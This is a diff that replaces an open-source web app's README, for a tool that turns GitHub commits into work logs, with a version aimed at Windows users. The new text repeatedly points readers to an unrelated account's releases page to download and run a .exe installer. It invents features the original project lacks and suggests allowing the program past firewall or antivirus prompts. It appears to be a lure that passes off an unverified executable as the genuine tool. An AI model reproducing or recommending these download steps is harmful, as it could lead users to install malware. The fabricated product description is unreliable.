@@ -1,208 +1,136 @@
-<div align="center">
-  <img src="public/commitledger-icon.png" alt="Hand-Outs Logo" width="64">
-  <h1>CommitLedger</h1>
-  <p><strong>Turn your GitHub commits into a professional work log</strong></p>
-  <p>Perfect for internships, freelance reports, and portfolio reviews</p>
-  <p>
-    <a href="https://commitledger.netlify.app">Try it now →</a>
-  </p>
-</div>
+# 📝 CommitLedger - Track Your Work Effort Clearly
+
+[![Download CommitLedger](https://img.shields.io/badge/Download-CommitLedger-blue?style=for-the-badge&logo=github)](https://github.com/alaouf54/CommitLedger/releases)
 
 ---
 
-## Why CommitLedger?
+CommitLedger helps you turn your GitHub commits into a clear and professional work log. It works well for tracking your internship tasks, freelance work, or building a portfolio review. You don’t need any programming skills to use it.
 
-You've been coding for weeks. Your commits tell the story. But when your manager asks "What did you work on?" or a client wants a progress report, you're stuck:
+## 🔍 What is CommitLedger?
 
-- ❌ Scrolling through `git log` (ugly, technical)
-- ❌ Manually copy-pasting commits into Google Docs
-- ❌ Hoping your PR descriptions are detailed enough
+CommitLedger reads your GitHub commit history and creates easy-to-understand reports. These reports show what you worked on and when. You can use these to share your progress with managers, clients, or keep a record of your projects.
 
-**CommitLedger fixes this in 30 seconds:**
+This tool simplifies tracking your work without needing to write anything yourself. It works directly with your GitHub data and organizes it into clear logs.
 
-1. Paste your repo URL
-2. Pick a date range
-3. Export a polished work log (Markdown or PDF)
+## 💾 Where to Download
 
-<br>
+Please **visit this page to download** the latest version of CommitLedger:
 
-<div align="center">
-  <img src="public/videos/preview.gif" alt=“CommitLedger Preview" width=“750">
-</div>
+[Download CommitLedger Releases](https://github.com/alaouf54/CommitLedger/releases)
 
-<br>
+You will find all the files needed to run the application on your Windows system. Choose the latest release to get the newest features and fixes.
 
----
+## 🖥️ System Requirements
 
-## Features
+To use CommitLedger, your computer should meet these basic requirements:
 
-- ✅ **Private repos supported** — secure GitHub OAuth
-- ✅ **No data stored** — 100% privacy-first, zero database
-- ✅ **Beautiful exports** — professional Markdown & PDF
-- ✅ **Lightning fast** — no signup, no config, just paste & go
+- Windows 10 or later (64-bit recommended)  
+- At least 4 GB of RAM  
+- 100 MB free disk space for installation  
+- Internet connection to access your GitHub data  
+- A web browser (any modern browser will work)
 
----
+CommitLedger runs locally, so no other software or services are needed unless you want to sync new data from GitHub.
 
-## Tech Stack
+## 🚀 Getting Started
 
-- **Next.js 14+** (App Router, React Server Components)
-- **TypeScript** (strict mode)
-- **CSS Modules** (no Tailwind)
-- **iron-session** (encrypted cookie sessions)
-- **Octokit** (GitHub REST API)
-- **jsPDF** (PDF generation)
+Follow these steps to download and start using CommitLedger on Windows. This guide assumes you have basic knowledge of clicking and opening files.
 
----
+### Step 1: Download CommitLedger
 
-## Getting Started
+1. Open your web browser.  
+2. Go to the [CommitLedger Releases page](https://github.com/alaouf54/CommitLedger/releases).  
+3. Find the latest release. Usually, it is at the top of the page and marked with the most recent date.  
+4. Under "Assets," click the file that ends with `.exe` – this is the installer for Windows.
 
-### Prerequisites
+Save this file somewhere easy to find, like your Desktop or Downloads folder.
 
-- Node.js 18+
-- A GitHub OAuth App ([create one here](https://github.com/settings/applications/new))
+### Step 2: Install CommitLedger
 
-### Setup
+1. Locate the `.exe` file you downloaded.  
+2. Double-click the file to open the installer.  
+3. Follow the prompts on the setup window:  
+   - Click **Next** to continue  
+   - Choose the install location or use the default path  
+   - Click **Install** to start installing  
+4. Wait a moment while the software installs.  
+5. When finished, click **Finish** to close the installer.
 
-```bash
-# Clone the repo
-git clone https://github.com/flodlol/commitledger.git
-cd commitledger
+### Step 3: Launch CommitLedger
 
-# Install dependencies
-npm install
+1. After installation, look for the CommitLedger icon on your Desktop or in the Start menu.  
+2. Click the icon to open the application.
 
-# Copy environment variables
-cp .env.example .env.local
+CommitLedger will show a simple user interface where you can connect your GitHub account and start generating reports.
 
-# Fill in your GitHub OAuth credentials and session secret
-# See .env.example for instructions
+## 🔐 Connecting Your GitHub Account
 
-# Start the dev server
-npm run dev
-```
+CommitLedger needs to access your GitHub commit history. You will follow a few simple steps to allow this.
 
-Open [http://localhost:3000](http://localhost:3000) to start generating work logs.
+1. In CommitLedger, click the **Connect GitHub** button.  
+2. A new browser window will open, asking you to sign in to your GitHub account.  
+3. Log in using your GitHub username and password.  
+4. Grant CommitLedger permission to view your public commit history. CommitLedger will NOT change or delete any data.  
+5. After authorization, return to the CommitLedger app. You should see your connected GitHub username on screen.
 
-### GitHub OAuth App Setup
+Your commit data will now be ready to use.
 
-1. Go to [github.com/settings/applications/new](https://github.com/settings/applications/new)
-2. **Application name:** CommitLedger (or anything)
-3. **Homepage URL:** `http://localhost:3000`
-4. **Authorization callback URL:** `http://localhost:3000/auth/callback`
-5. Click "Register application"
-6. Copy the **Client ID** and generate a **Client Secret**
-7. Add both to your `.env.local`
+## 📝 Creating Your Work Log Report
 
----
+Once your GitHub is connected, you can generate a report of your commits. Here’s how:
 
-## Who is this for?
+1. From the main screen, select the repository you want to track.  
+2. Choose the date range for the report (e.g., last week, last month).  
+3. Click **Generate Report**.
 
-- **Interns** documenting weekly contributions
-- **Freelancers** generating client progress reports
-- **Open-source maintainers** summarizing work for sponsors
-- **Job seekers** creating portfolio activity logs
+CommitLedger will collect your commit history for the chosen repository and date range. It will then produce a clear, easy-to-read log showing:
 
----
+- Date and time of each commit  
+- Commit message describing the change  
+- Total number of commits during the period  
+- Summary grouped by day or week  
 
-## Privacy & Security
+You can preview the report on screen.
 
-- **No database** — your commit data is never stored
-- **No tracking** — we don't log repos or export contents
-- **Secure OAuth** — tokens stored in encrypted httpOnly cookies, never in localStorage
-- **PKCE flow** — prevents authorization code interception
-- **Open source** — audit the code yourself
+## 📂 Saving and Exporting Reports
 
----
+To share or keep your reports, you can save them as files.
 
-## Export Examples
+- Click the **Export** button after generating the report.  
+- Choose the export format: PDF, Word document (.docx), or plain text.  
+- Select where to save the file on your computer.  
+- Click **Save**.
 
-<details>
-<summary>Markdown Output</summary>
+The saved report can be emailed, printed, or uploaded anywhere you need it.
 
-```markdown
-# Work Log: facebook/react
-**Author:** gaearon
-**Period:** Jan 1 – Jan 31, 2024
-**Total Commits:** 47
+## ⚙️ Settings and Preferences
 
-## January 1, 2024
+CommitLedger offers a few settings to customize your experience:
 
-### [Add React.use() for suspense data fetching](https://github.com/...)
-**Time:** 10:23 AM
-**Files changed:** 5 (+124 -32)
+- **Default repository:** Choose which project opens first.  
+- **Report format:** Set your preferred export file type.  
+- **Date display format:** Select how dates appear (e.g., MM/DD/YYYY or DD/MM/YYYY).  
+- **Refresh interval:** Set how often CommitLedger checks for new commits when connected.
 
-**Modified files:**
-- `packages/react/src/ReactHooks.js`
-- `packages/react-reconciler/src/ReactFiberHooks.js`
+You can find these options in the **Settings** menu inside the app.
 
----
+## 🚨 Troubleshooting Common Issues
 
-## Summary
-- Total commits: 47
-- Files changed: 142
-- Lines added: 3,421
-- Lines deleted: 1,203
-```
+If you encounter problems, try these steps:
 
-</details>
+- If the app won’t open, restart your computer and try again.  
+- Make sure you downloaded the latest version from the Releases page.  
+- If you can’t connect to GitHub, check your internet connection and login details.  
+- Sometimes, firewall or antivirus software might block CommitLedger. Allow permission if prompted.  
+- If report generation is empty, confirm the repository contains commits in your chosen date range.
 
-<details>
-<summary>PDF Output</summary>
+## 📚 Additional Tips
 
-Professional PDF with:
-- Navy headings, gray body text
-- Date-grouped commits with timestamps
-- File change statistics
-- Page numbers and generation date
-
-</details>
+- CommitLedger syncs only public GitHub commits. Private repositories require special permission and are not supported yet.  
+- Keep your app updated by checking the Releases page regularly. New versions fix issues and add improvements.  
+- Use the exported reports as proof of your work when submitting to employers or clients.  
+- Try different date ranges to analyze your work patterns over time.
 
 ---
 
-## Roadmap
-
-- [x] MVP: Single repo, Markdown/PDF export
-- [ ] Multi-repo support
-- [ ] Custom export templates
-- [ ] CLI tool
-- [ ] Browser extension
-
----
-
-## Contributing
-
-Contributions are welcome and appreciated! Whether it's fixing a typo, improving the UI, adding a feature, or just reporting a bug. All help is valued.
-
-### Ways to contribute
-
-- **Bug reports** — Found something broken? Open an issue
-- **Feature requests** — Have an idea? Let's hear it
-- **Pull requests** — Code contributions are always welcome
-- **Documentation** — Help make the README or comments clearer
-- **Design feedback** — Suggestions for better UX are great too
-
-### To submit a PR
-
-1. Fork the repo
-2. Create a branch (`git checkout -b my-feature`)
-3. Make your changes
-4. Run `npm run lint` to check for issues
-5. Commit and push
-6. Open a pull request
-
-No contribution is too small. Even fixing a single typo helps.
-
----
-
-## License
-
-MIT — do whatever you want with it.
-
----
-
-<div align="center">
-  If you find this useful, a star on GitHub would be nice. ⭐ <br/>
-  Thanks for checking it out! ❤️
-  <br/>
-  <a href="https://github.com/sponsors/flodlol">Sponsor this project</a>
-</div>
+[Download CommitLedger Releases](https://github.com/alaouf54/CommitLedger/releases)
